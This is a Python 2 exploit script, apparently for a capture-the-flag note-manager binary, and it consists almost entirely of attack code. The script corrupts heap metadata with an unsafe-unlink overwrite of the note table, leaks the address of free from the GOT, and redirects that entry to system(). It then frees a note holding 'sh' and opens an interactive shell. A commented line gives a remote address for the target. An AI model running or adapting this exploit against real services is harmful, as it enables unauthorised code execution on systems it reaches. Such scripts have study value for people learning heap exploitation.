#!/usr/bin/env python
import socket
import struct
import telnetlib
import time

def p(d):
    return struct.pack("<Q", d)
#s = socket.create_connection(("119.254.101.197", 10002))
s = socket.create_connection(("127.0.0.1", 4445))
def rt(delim):
    buf = ""
    while not delim in buf:
        buf += s.recv(1)
    print buf
    return buf
def rall():
    buf = ""
    s.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin > .5:
            break
        elif time.time() - begin > 1:
            break
    try:
        data = s.recv(4096)
        if data:
            begin = time.time()
            buf += data
        else:
            time.sleep(.1)
    except:
        pass
    return buf
def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def list_note():
    s.sendall("1\n")
    time.sleep(1)
    tmp = s.recv(2048)
    pos = tmp.find("0:")
    addr = tmp[pos+3:pos+19]
    free_addr = struct.unpack("<Q",addr.decode('hex'))[0]
    return free_addr
def new_note(length, content):
    s.sendall("2\n")
    s.sendall(str(length) + "\n")
    s.sendall(content + "\n")
    rt(">")
def edit_note(num, length, data):
    s.sendall("3\n")
    s.sendall(str(num) + "\n")
    s.sendall(str(length) + "\n")
    s.sendall(data + "\n")
def del_note(num):
    s.sendall("4\n")
    s.sendall(str(num)+"\n")
    rt(">")

def overwrite_notetable():
    size = 0x100
    offset = 0x7fe7fa9edc40 - 0x7fe7fa657640
    #raw_input("pause")
    new_note(size, "A"*size) # note 0
    new_note(size, "B"*size) # note 1
    new_note(size, "C"*size) # note 2
    new_note(size, "D"*size) # note 3
    raw_input('pause')
    fd=0x6016b8
    bk=fd+8
    edit_note(0,size*3,p(0x0) + p(0x1) + p(fd) + p(bk) + "A"*(size - 0x20) + p(0x100) + p(0x110) + "A"*size +p(0) + p(0x111)+ "A"*(size-0x20))
    del_note(1)
    raw_input('1')
    edit_note(0,32,p(0x0)+p(0x1)+p(0x8)+p(0x601600))
    free_addr = list_note()
    system_addr = free_addr - offset
    edit_note(0,8,p(system_addr))
    edit_note(2,3,"sh\x00")
    del_note(2)

    print("[+] Shell ready:")

    while 1:
        s.send(raw_input('#')+'\x0a')
        print s.recv(1024)
 
    
def go():
    print "Let's go!"
    # address of printf@GOT
    #printf_got = 0x602030
    #libc_addr = info_leak_libc()
    #print ("[+] libc @ " + hex(libc_addr))
    #a=raw_input("first:")
    #heap_addr = info_leak_heap()
    #print ("[+] heap @ " + hex(heap_addr))
    #one_shot_shell = libc_addr - 0x3782b8
    #print ("[+] Exploiting double free")
    overwrite_notetable()

    
    #edit_note(0, 0x300, p(0x100) + p(1) + p(0x8) + p(printf_got) + "A"*1024)
    #edit_note(0, 8, p(one_shot_shell))
    #rall()
    #print("[+] Shell ready:")
    interact()
go()
